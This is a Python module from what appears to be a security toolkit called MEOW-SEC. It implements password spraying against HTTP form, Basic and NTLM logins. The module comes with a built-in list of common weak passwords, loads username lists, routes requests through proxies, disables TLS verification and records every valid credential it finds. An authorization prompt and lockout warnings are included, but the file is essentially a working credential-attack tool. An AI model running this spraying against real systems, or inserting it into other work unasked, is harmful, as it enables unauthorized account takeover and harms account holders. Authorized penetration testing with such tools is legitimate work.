# -*- coding: utf-8 -*-
"""
MEOW-SEC :: SPRAY — Password Spraying Module
For authorized security testing and CTF challenges only.
"""
import os, re, json, time, threading
from datetime import datetime

from core.ui import (console, ok, err, info, warn, find, boot_progress,
                     print_result_table, show_module_banner, ask_target,
                     ask_choice, G1, G2, CY, OR, RD, DM)
from core.cats import CAT_FOUND, CAT_SCAN, cat_talk
from rich.prompt import Confirm, Prompt

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

from core.proxy_manager import px as _px

# ─── COMMON SPRAY PASSWORDS ───────────────────────────────────
DEFAULT_PASSWORDS = [
    "Password1", "Password123", "Welcome1", "Welcome123",
    "Summer2024", "Summer2025", "Summer2026",
    "Winter2024", "Winter2025", "Winter2026",
    "Spring2025", "Fall2024",
    "Company1", "Company123",
    "Admin1234", "Admin@123",
    "P@ssw0rd", "P@ssword1",
    "Qwerty123", "Letmein1",
    "January2025", "February2025", "March2025",
    "123456789", "1234567890",
    "changeme", "changeme1",
]

def _try_http_form(url: str, username: str, password: str,
                   user_field: str, pass_field: str,
                   success_text: str, fail_text: str,
                   extra_data: dict, timeout: int = 8) -> dict:
    data = {user_field: username, pass_field: password}
    data.update(extra_data)
    try:
        r = requests.post(url, data=data, timeout=timeout,
                          verify=False, allow_redirects=True,
                          proxies=_px(),
                          headers={"User-Agent": "MEOW-SPRAY/1.1 (authorized-test)",
                                   "Content-Type": "application/x-www-form-urlencoded"})
        # Determine success
        if success_text and success_text.lower() in r.text.lower():
            return {"ok": True, "status": r.status_code, "len": len(r.text)}
        if fail_text and fail_text.lower() in r.text.lower():
            return {"ok": False, "status": r.status_code, "len": len(r.text)}
        # Heuristic: redirect after POST usually means success
        if r.history and r.status_code == 200:
            return {"ok": True, "status": r.status_code, "len": len(r.text),
                    "note": "redirect detected"}
        return {"ok": False, "status": r.status_code, "len": len(r.text)}
    except Exception as e:
        return {"ok": False, "status": 0, "error": str(e)[:40]}

def _try_basic_auth(url: str, username: str, password: str, timeout: int = 8) -> dict:
    try:
        r = requests.get(url, auth=(username, password), timeout=timeout,
                         verify=False, proxies=_px(),
                         headers={"User-Agent": "MEOW-SPRAY/1.1 (authorized-test)"})
        return {"ok": r.status_code == 200, "status": r.status_code}
    except Exception as e:
        return {"ok": False, "status": 0, "error": str(e)[:40]}

def _try_ntlm(url: str, username: str, password: str, domain: str = "", timeout: int = 8) -> dict:
    try:
        from requests_ntlm import HttpNtlmAuth
        auth = HttpNtlmAuth(f"{domain}\\{username}" if domain else username, password)
        r = requests.get(url, auth=auth, timeout=timeout, verify=False, proxies=_px(),
                         headers={"User-Agent": "MEOW-SPRAY/1.1"})
        return {"ok": r.status_code == 200, "status": r.status_code}
    except ImportError:
        return {"ok": False, "status": 0, "error": "requests_ntlm not installed"}
    except Exception as e:
        return {"ok": False, "status": 0, "error": str(e)[:40]}

# ─── MAIN ─────────────────────────────────────────────────────
def run(target: str = None):
    show_module_banner("spray")
    cat_talk(CAT_SCAN, "SPRAY module active — one password, many accounts...", RD)
    console.print()

    warn("Password spraying must only be performed on systems you own or have explicit written permission to test.")
    warn("Accounts may be locked out if rate limiting is not respected.")
    console.print()
    if not Confirm.ask(f"  [{RD}]I have explicit written authorization for this target[/]"):
        info("Aborted."); return
    console.print()

    if not target:
        target = ask_target("Target URL (https://example.com/login)")
    if not target:
        err("No target."); return

    if not target.startswith("http"):
        target = "https://" + target

    console.print(f"  [{G1}][1][/] HTTP Form POST")
    console.print(f"  [{G1}][2][/] HTTP Basic Auth")
    console.print(f"  [{G1}][3][/] NTLM Auth")
    mode = ask_choice("Mode", "1")

    # Load usernames
    console.print()
    info("Username list — enter path to file or type manually (comma-separated):")
    user_input = Prompt.ask(f"  [{CY}]Usernames (file or list)[/]").strip()
    usernames = []
    if os.path.isfile(user_input):
        with open(user_input, encoding="utf-8", errors="ignore") as f:
            usernames = [l.strip() for l in f if l.strip()]
    elif user_input:
        usernames = [u.strip() for u in user_input.split(",") if u.strip()]
    if not usernames:
        err("No usernames."); return
    info(f"Loaded [{CY}]{len(usernames)}[/] usernames")

    # Load passwords
    pass_input = Prompt.ask(f"  [{CY}]Passwords (file/list/ENTER for defaults)[/]", default="").strip()
    passwords = []
    if pass_input and os.path.isfile(pass_input):
        with open(pass_input, encoding="utf-8", errors="ignore") as f:
            passwords = [l.strip() for l in f if l.strip()]
    elif pass_input:
        passwords = [p.strip() for p in pass_input.split(",") if p.strip()]
    else:
        passwords = DEFAULT_PASSWORDS
        info(f"Using [{CY}]{len(passwords)}[/] default spray passwords")

    delay_str = Prompt.ask(f"  [{CY}]Delay between attempts in seconds (recommended ≥30)[/]", default="30")
    try:
        delay = float(delay_str)
    except ValueError:
        delay = 30.0

    # Form-specific config
    user_field = "username"
    pass_field = "password"
    success_text = ""
    fail_text = ""
    extra_data = {}
    domain = ""

    if mode == "1":
        user_field  = Prompt.ask(f"  [{CY}]Username field name[/]", default="username")
        pass_field  = Prompt.ask(f"  [{CY}]Password field name[/]", default="password")
        success_text = Prompt.ask(f"  [{CY}]Text on SUCCESS page (optional)[/]", default="")
        fail_text    = Prompt.ask(f"  [{CY}]Text on FAILURE page (optional)[/]", default="")
    elif mode == "3":
        domain = Prompt.ask(f"  [{CY}]Windows domain (blank if none)[/]", default="")

    console.print()
    info(f"Starting spray: [{CY}]{len(usernames)}[/] users × [{CY}]{len(passwords)}[/] passwords")
    info(f"Delay: [{CY}]{delay}s[/] between attempts  (total estimated: {len(usernames)*len(passwords)*delay/60:.1f} min)")
    console.print()

    findings = []
    total_attempts = 0

    for password in passwords:
        info(f"Testing password: [{OR}]{password}[/]")
        for username in usernames:
            total_attempts += 1
            if mode == "1":
                res = _try_http_form(target, username, password,
                                     user_field, pass_field,
                                     success_text, fail_text, extra_data)
            elif mode == "2":
                res = _try_basic_auth(target, username, password)
            else:
                res = _try_ntlm(target, username, password, domain)

            if res.get("ok"):
                findings.append({"username": username, "password": password,
                                  "status": res.get("status"), "note": res.get("note","")})
                find(f"VALID CREDENTIALS: [{CY}]{username}[/] : [{G1}]{password}[/]")
            else:
                info(f"  [{DM}]{username:<30} {res.get('status',0)}[/]")

            if delay > 0:
                time.sleep(delay)

        # Extra delay between passwords
        if delay > 0 and len(passwords) > 1:
            info(f"Password cycle done. Waiting {delay*2:.0f}s before next password...")
            time.sleep(delay * 2)

    console.print()
    info(f"Total attempts: [{CY}]{total_attempts}[/]")
    if findings:
        rows = [(f["username"], f["password"], str(f["status"]), f["note"])
                for f in findings]
        print_result_table("Valid Credentials Found", ["USERNAME", "PASSWORD", "STATUS", "NOTE"], rows)
    else:
        ok("No valid credentials found.")

    _save(target, findings)

def _save(target, findings):
    out = os.path.join(os.path.dirname(__file__), "..", "data")
    os.makedirs(out, exist_ok=True)
    fname = os.path.join(out, f"spray_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
    with open(fname, "w", encoding="utf-8") as f:
        json.dump({"target": target, "findings": findings, "time": datetime.now().isoformat()}, f, indent=2)
    ok(f"Results saved → [{CY}]{os.path.basename(fname)}[/]")
